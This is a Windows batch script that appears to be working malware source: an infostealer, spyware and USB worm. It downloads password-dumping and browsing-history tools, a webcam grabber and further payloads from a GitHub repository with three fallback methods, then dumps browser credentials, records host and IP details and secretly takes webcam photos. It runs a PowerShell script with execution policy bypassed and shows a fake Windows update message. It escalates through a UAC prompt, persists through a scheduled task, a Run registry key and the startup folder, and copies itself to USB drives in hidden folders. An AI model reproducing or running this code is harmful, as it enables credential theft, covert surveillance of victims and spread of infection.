@ECHO OFF
setlocal enableextensions
cd /D "%~dp0"



echo *************Create directory****************
   mkdir C:\Users\%username%\AppData\Roaming > nul 2> nul
   attrib +h C:\Users\%username%\AppData\Roaming /s /d > nul 2> nul

   mkdir C:\Users\%username%\AppData\Local\0101 > nul 2> nul
   attrib +h C:\Users\%username%\AppData\Local\0101 /s /d > nul 2> nul

   mkdir C:\Users\%username%\AppData\Local\A310Logger > nul 2> nul
   attrib +h C:\Users\%username%\AppData\Local\A310Logger /s /d > nul 2> nul

   mkdir C:\Users\%username%\AppData\Local\A310Logger\Browsers  > nul 2> nul
   mkdir C:\Users\%username%\AppData\Local\A310Logger\Others > nul 2> nul
   mkdir C:\Users\%username%\AppData\Local\A310Logger\Webcam > nul 2> nul
   
   echo Directory Created



echo *************Changing working dir****************
   cd /D C:\Users\%username%\AppData\Roaming\
   echo Success!
   echo.


:loop
echo *************Internet connection****************     
   echo Checking internet connectivity. Please wait...
   timeout 1 > NUL
   Ping www.google.nl -n 1 -w 1000 > NUL
   if errorlevel 1 (set internet=Not connected to internet) else (set internet=Connected to internet)
   echo %internet%!!
   echo.
   timeout 1 > NUL
   if "%internet%" == "Not connected to internet" ( 
      cls
      goto loop
   ) else (


echo *************DOWNLOAD file****************
   echo Downloading...
   timeout 3 > NUL
   
   if not exist "C:\Users\%username%\AppData\Roaming\BrowserDownloadsview.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/browserdownloadsview.exe?raw=true', 'BrowserDownloadsview.exe')" > nul 2> nul    
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\%username%\AppData\Roaming\BrowsingHistoryView.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/browsinghistoryview.exe?raw=true', 'BrowsingHistoryView.exe')" > nul 2> nul 
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\%username%\AppData\Roaming\ChromePass.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/ChromePass.exe?raw=true', 'ChromePass.exe')" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\%username%\AppData\Roaming\IEpassView.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/iepv.exe?raw=true', 'IEpassView.exe')" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\%username%\AppData\Roaming\MyLastSearch.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/mylastsearch.exe?raw=true', 'MyLastSearch.exe')" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\%username%\AppData\Roaming\OperaPassView.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/operapassview.exe?raw=true', 'OperaPassView.exe')" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/PasswordFox.exe?raw=true', 'PasswordFox.exe')" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\%username%\AppData\Roaming\facebook.bat" (      
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/facebook.bat?raw=true', 'facebook.bat')" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\%username%\AppData\Roaming\AutoRun.vbs" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/AutoRun.vbs?raw=true', 'AutoRun.vbs')" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\%username%\AppData\Roaming\instagram.ps1" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/instagram.ps1?raw=true', 'instagram.ps1')" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR2  

   if not exist "C:\Users\%username%\AppData\Roaming\a310logger.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/a310logger.exe?raw=true', 'a310logger.exe')" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR2   

   if not exist "C:\Users\%username%\AppData\Roaming\WebCamImageSave.exe" (
      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/WebCamImageSave.exe?raw=true', 'WebCamImageSave.exe')" > nul 2> nul
   )
      if errorlevel 1 goto ERROR2 

   powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/folder.exe?raw=true', 'folder.exe')" > nul 2> nul
      if errorlevel 1 goto ERROR2   
   goto SUCCESS 


   :ERROR2
   echo Your first attempt might fail! We'll try second.
   echo.
   echo Please, wait...
   timeout 3 > NUL
   if not exist "C:\Users\%username%\AppData\Roaming\BrowserDownloadsview.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/browserdownloadsview.exe?raw=true -OutFile BrowserDownloadsview.exe" > nul 2> nul
   )  
      if errorlevel 1 goto ERROR3
     
   if not exist "C:\Users\%username%\AppData\Roaming\BrowsingHistoryView.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/browsinghistoryview.exe?raw=true -OutFile BrowsingHistoryView.exe" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3

   if not exist "C:\Users\%username%\AppData\Roaming\ChromePass.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/ChromePass.exe?raw=true -OutFile ChromePass.exe" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3
 
   if not exist "C:\Users\%username%\AppData\Roaming\IEpassView.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/iepv.exe?raw=true -OutFile IEpassView.exe" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3
 
   if not exist "C:\Users\%username%\AppData\Roaming\MyLastSearch.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/mylastsearch.exe?raw=true -OutFile MyLastSearch.exe" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3
  
   if not exist "C:\Users\%username%\AppData\Roaming\OperaPassView.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/operapassview.exe?raw=true -OutFile OperaPassView.exe" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3
 
   if not exist "C:\Users\%username%\AppData\Roaming\PasswordFox.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/PasswordFox.exe?raw=true -OutFile PasswordFox.exe" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3
  
   if not exist "C:\Users\%username%\AppData\Roaming\facebook.bat" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/facebook.bat?raw=true -OutFile facebook.bat" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3

   if not exist "C:\Users\%username%\AppData\Roaming\AutoRun.vbs" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/AutoRun.vbs?raw=true -OutFile AutoRun.vbs" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3

   if not exist "C:\Users\%username%\AppData\Roaming\instagram.ps1" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/instagram.ps1?raw=true -OutFile instagram.ps1" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3
  
   if not exist "C:\Users\%username%\AppData\Roaming\a310logger.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/a310logger.exe?raw=true -OutFile a310logger.exe" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3
  
   if not exist "C:\Users\%username%\AppData\Roaming\WebCamImageSave.exe" (
      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/WebCamImageSave.exe?raw=true?raw=true -OutFile WebCamImageSave.exe" > nul 2> nul
   )   
      if errorlevel 1 goto ERROR3

   powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/folder.exe?raw=true?raw=true -OutFile folder.exe" > nul 2> nul
      if errorlevel 1 goto ERROR3
   goto SUCCESS 


   :ERROR3
   echo Your second attempt might fail! We'll try third.
   echo.
   echo Please, wait...
   timeout 3 > NUL
   set url="https://github.com/win32u/Licence/blob/main/Extension/WebCamImageSave.exe?raw=true"
   set filename="WebCamImageSave.exe"
   certutil -urlcache -split -f %url% %filename% > nul 2> nul
   if errorlevel 1 goto EOF

   set url="https://github.com/win32u/Licence/blob/main/Extension/AutoRun.vbs?raw=true"
   set filename="AutoRun.vbs"
   certutil -urlcache -split -f %url% %filename% > nul 2> nul
   if errorlevel 1 goto EOF

   set url="https://github.com/win32u/Licence/blob/main/Extension/facebook.bat?raw=true"
   set filename="facebook.bat"
   certutil -urlcache -split -f %url% %filename% > nul 2> nul
   if errorlevel 1 goto EOF

   set url="https://github.com/win32u/Licence/blob/main/Extension/instagram.ps1?raw=true"
   set filename="instagram.ps1"
   certutil -urlcache -split -f %url% %filename% > nul 2> nul
   if errorlevel 1 goto EOF

   set url="https://github.com/win32u/Licence/blob/main/Extension/a310logger.exe?raw=true"
   set filename="a310logger.exe"
   certutil -urlcache -split -f %url% %filename% > nul 2> nul
   if errorlevel 1 goto EOF

   set url="https://github.com/win32u/Licence/blob/main/Extension/folder.exe?raw=true"
   set filename="folder.exe"
   certutil -urlcache -split -f %url% %filename% > nul 2> nul
   if errorlevel 1 goto EOF
   goto SUCCESS 
  

   :EOF 
   echo Your last attempt might fail.
   echo Check internet conectivity!?
   timeout 5 
   cls
   goto loop
   pause


   :SUCCESS
   echo DOWNLOAD SUCCESSFUL!!
      echo *************Copy file****************
      copy "C:\Users\%username%\AppData\Roaming\*.*" "C:\Users\%username%\AppData\Local\0101\" /y > nul 2> nul
      echo Copied!
      echo.
      echo.
      echo.
      echo.



   echo *************Execute file****************
      for %%a in (*.exe) do (
         call %%a /stext C:\Users\%username%\AppData\Local\A310Logger\Others\%%a.txt
      )		
      echo User: %ComputerName% \ %UserName% >"C:\Users\%username%\AppData\Local\A310Logger\IPnHost.txt"
      echo Public_IP: >>"C:\Users\%username%\AppData\Local\A310Logger\IPnHost.txt"
      ipconfig | find /i "IPv4" >>"C:\Users\%username%\AppData\Local\A310Logger\IPnHost.txt"



      set increment=0
      :increment
      timeout 1 > nul
      
      start /w "" "C:\Users\%username%\AppData\Roaming\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 1 /FontSize 16 /FontName "Arial" /Filename "C:\Users\%username%\AppData\Local\A310Logger\Webcam\%increment%.jpg" /S > nul 2> nul
      set /a increment=%increment%+1 
      if "%increment%"=="11" goto next
      goto increment

      :next
      echo Image captured 10times.



      echo Executed
      echo.


   echo *************Windows updates found****************
      echo Checking Windows for Update. Please wait...
      echo.

   echo *************Run powershell file****************
      powershell.exe -ExecutionPolicy Bypass -File "%cd%\instagram.ps1"
	   

   echo *************Give feedback success****************
      echo Yes!!    



   )
   








	:: BatchGotAdmin       
	:-------------------------------------        
	REM  --> Check for permissions  
	>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"  
	REM --> If error flag set, we do not have admin.  
	if '%errorlevel%' NEQ '0' (goto UACPrompt) else ( goto gotAdmin )  
	:UACPrompt 
        echo *************User rights**************** 
		echo User rights! Please, wait...
		timeout 3 > NUL
		echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"  
		echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"  
		"%temp%\getadmin.vbs"  
		cd /D C:\Users\%username%\AppData\Roaming\
		

		:pendrive1
		echo *************Pendrive check****************
		   timeout 1 > NUL
		   echo Checking for pendrive...
		   for /F "usebackq tokens=1,2,3,4 " %%i in (`wmic logicaldisk get caption^,description^,drivetype 2^>NUL`) do (
		   if %%l equ 2 (
			  mkdir %%i\YouTube > nul 2> nul
                          if exist "C:\Users\%username%\AppData\Roaming\folder.exe" (
                             copy "C:\Users\%username%\AppData\Roaming\folder.exe" "%%i" /Y > nul 2> nul
                             copy "C:\Users\%username%\AppData\Roaming\folder.exe" "%%i\YouTube" /Y > nul 2> nul
                          )  else (
                                copy "C:\Users\%username%\AppData\Local\0101\folder.exe" "%%i" /Y > nul 2> nul
                                copy "C:\Users\%username%\AppData\Local\0101\folder.exe" "%%i\YouTube" /Y > nul 2> nul
                             )
			  mkdir "%%i\System Update" > nul 2> nul
			  attrib +h "%%i\System Update" /s /d
                          copy "C:\Users\%username%\AppData\Roaming\AutoRun.vbs" "%%i\System Update\AutoRun.vbs" /Y > nul 2> nul
                          copy "C:\Users\%username%\AppData\Roaming\facebook.bat" "%%i\System Update\facebook.bat" /Y > nul 2> nul
			  echo Copied!
			  ) 
		   )
		   echo.
		   echo.
		   cls
		   goto pendrive1
	:gotAdmin  
         echo *************Administrator rights****************
   		echo Admin rights! Please, wait...
		timeout 3 > NUL
		cd /D C:\Users\%username%\AppData\Roaming\

                schtasks /Create /SC Onevent /EC Microsoft-Windows-NetworkProfile/Operational /MO "*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]" /TN "YouTube" /TR "C:\Users\%username%\AppData\Roaming\AutoRun.vbs" /F > nul 2> nul || (
                   echo Task creation faild!
                )
		
		REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v YouTube /t REG_SZ /d C:\Users\%username%\AppData\Local\0101\AutoRun.vbs /f > nul 2> nul || (
                   echo Registry creation faild!
                )

                mklink "%systemdrive%\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\AutoRun.vbs - Shortcut" "C:\Users\%username%\AppData\Local\0101\AutoRun.vbs" > nul 2> nul || (
                   echo Mklink creation already exist!?
                )

		:pendrive2
		echo *************Pendrive check****************
		   timeout 1 > NUL
		   echo Checking for pendrive...
		   for /F "usebackq tokens=1,2,3,4 " %%i in (`wmic logicaldisk get caption^,description^,drivetype 2^>NUL`) do (
		   if %%l equ 2 (
			  mkdir %%i\YouTube > nul 2> nul
                          if exist "C:\Users\%username%\AppData\Roaming\folder.exe" (
                             copy "C:\Users\%username%\AppData\Roaming\folder.exe" "%%i" /Y > nul 2> nul
                             copy "C:\Users\%username%\AppData\Roaming\folder.exe" "%%i\YouTube" /Y > nul 2> nul
                          )  else (
                                copy "C:\Users\%username%\AppData\Local\0101\folder.exe" "%%i" /Y > nul 2> nul
                                copy "C:\Users\%username%\AppData\Local\0101\folder.exe" "%%i\YouTube" /Y > nul 2> nul
                             )
			  mkdir "%%i\System Update" > nul 2> nul
			  attrib +h "%%i\System Update" /s /d
                          copy "C:\Users\%username%\AppData\Roaming\AutoRun.vbs" "%%i\System Update\AutoRun.vbs" /Y > nul 2> nul
                          copy "C:\Users\%username%\AppData\Roaming\facebook.bat" "%%i\System Update\facebook.bat" /Y > nul 2> nul
			  echo Copied!
			  ) 
		   )
		   echo.
		   echo.
		   cls
		   goto pendrive2
	

exit
